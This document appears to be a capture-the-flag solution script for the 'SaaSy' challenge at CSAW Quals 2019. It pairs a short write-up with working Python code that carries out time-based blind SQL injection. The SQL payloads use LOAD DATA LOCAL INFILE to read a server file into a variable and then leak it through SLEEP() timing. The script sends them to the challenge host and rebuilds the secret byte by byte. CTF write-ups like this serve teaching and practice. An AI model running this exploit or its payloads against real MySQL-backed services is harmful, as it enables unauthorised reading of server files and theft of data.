"""

Solution for SaaSy CSAW Quals 2019
Written by Pear0 // Will Gulian

This challenge is pretty obviously blind SQL injection, but /flag is located
on the web server which poses a challenge because it will have to be read by
the MySQL client. The only command that can read a local file is `LOAD DATA LOCAL ...`
https://dev.mysql.com/doc/refman/5.7/en/load-data.html .

For some reason any commands after `LOAD DATA ...` don't seem to execute. My suspicion
is that `LOAD DATA` is throwing some late stage error so we need to get the flag and
exfiltrate it during `LOAD DATA`. How is that possible? MySQL has the concept of variables
`@foo` that can be bound values and used later within a session, and `LOAD DATA` supports
them.

So we can write code like this to load the flag into a variable:
```
LOAD DATA LOCAL INFILE "/flag" INTO TABLE foo_bar (@abb);
```

But now we need to exfiltrate the flag. `LOAD DATA` can have a `... SET col = {expr}` clause
at the end and because of the order MySQL executes, a variable bound to the flag will be bound
before the SET clause. All we need to is to make a valid expression. Fortunately `sleep()` returns
an INT.

By doing this, we can exfiltrate information about the flag using our bound variable `@abb`. In the
implementation below, the shift subtract method is used, but binary search would work as well.
```
LOAD DATA LOCAL INFILE "/flag" INTO TABLE foo_bar
            (@abb) SET num = SLEEP(length(@abb));
```

"""


from __future__ import division

import requests
import time


url = 'http://web.chal.csaw.io:8080'

def execute(query, verbose=False):
    response = requests.post(url, {'scream': query})
    if verbose:
        print(response.content)


def exfiltrate(func, int_size=8, anim=True):
    """
    Take an arbitrary function with signature func(shift, sub) -> bool
    where shift and sub allow a single bit of an unknown number to be targeted
    in some expression like this ((unknown >> shift) - sub ) != 0
    """
    acc = 0
    display = ['-'] * int_size

    if anim:
        print(''.join(display), end='\r', flush=True)
    for i in reversed(range(0, int_size)):
        acc *= 2
        val = int(func(i, acc))
        acc += val
        display[i] = str(val)
        if anim:
            print(''.join(display[::-1]), end='\r', flush=True)
    
    if anim:
        print(''.join(display[::-1]), '->', acc)
    return acc


def exfil_sleep(query, **kwargs):
    """
    Use exfiltrate() and blind sleep to exfiltrate bytes. If a bit is 1, query should sleep for 2 seconds.
    Two second sleep results in very few errors, but they are still possible from network hiccups.
    """

    def inner(shift, sub):
        start = time.time()
        execute(query.format(shift=shift, sub=sub, **kwargs))
        total = time.time() - start

        return total > 1.9

    return exfiltrate(inner)


# demonstration of exfiltrate()
def test_num(shift, sub):
    return (193 >> shift) - sub

print('[test] 193 =', exfiltrate(test_num, anim=False))
assert exfiltrate(test_num, anim=False) == 193


# exfiltrate length() of @abb which is the text from /flag.
num_chars = exfil_sleep('''
        USE mysql;
        CREATE TEMPORARY TABLE foo_bar (num INT);

        LOAD DATA LOCAL INFILE "/flag" INTO TABLE foo_bar
            (@abb) SET num = SLEEP(((length(@abb) >> {shift}) - {sub}) * 2);
''')

print('length:', num_chars)

# ascii(substr()) to get each byte of the string.
builder = ''
for i in range(1, num_chars+1+1):
    value = exfil_sleep('''
        USE mysql;
        CREATE TEMPORARY TABLE foo_bar (num INT);

        LOAD DATA LOCAL INFILE "/flag" INTO TABLE foo_bar
            (@abb) SET num = SLEEP(((ascii(substr(@abb, {index}, 1)) >> {shift}) - {sub}) * 2);
''', index=i)

    builder += chr(value)
    print(builder)




